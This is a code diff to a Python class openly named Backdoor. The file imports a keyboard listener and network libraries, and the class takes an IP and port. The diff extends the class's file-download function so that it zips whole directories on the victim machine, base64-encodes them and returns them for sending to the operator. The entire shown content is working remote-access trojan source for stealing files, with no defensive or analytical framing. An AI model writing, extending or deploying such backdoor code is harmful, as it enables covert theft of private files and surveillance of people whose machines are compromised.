@@ -7,7 +7,7 @@ from pynput.keyboard import Key, Listener
 import logging, threading
 import requests
 import tempfile
-
+import zipfile
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -48,10 +48,24 @@ class Backdoor:
 
     def download_file(self, path):
         try:
-            with open(path, "rb") as file:
-                return base64.b64encode(file.read()).decode()
-        except FileNotFoundError:
-            return "[-] File not found!"
+            if os.path.isfile(path):
+                with open(path, "rb") as file:
+                    return base64.b64encode(file.read()).decode()
+            elif os.path.isdir(path):
+                temp_zip = tempfile.NamedTemporaryFile(delete=False)
+                zip_file = zipfile.ZipFile(temp_zip, 'w', zipfile.ZIP_DEFLATED)
+                for root, _, files in os.walk(path):
+                    for file in files:
+                        zip_file.write(os.path.join(root, file), 
+                                    os.path.relpath(os.path.join(root, file), os.path.join(path, '..')))
+                zip_file.close()
+                temp_zip.close()
+                with open(temp_zip.name, "rb") as file:
+                    content = base64.b64encode(file.read()).decode()
+                os.unlink(temp_zip.name)
+                return f"FOLDER:{os.path.basename(path)}:" + content
+            else:
+                return "[-] Path is neither a file nor a directory!"
         except Exception as e:
             return f"[-] Error: {str(e)}"
 
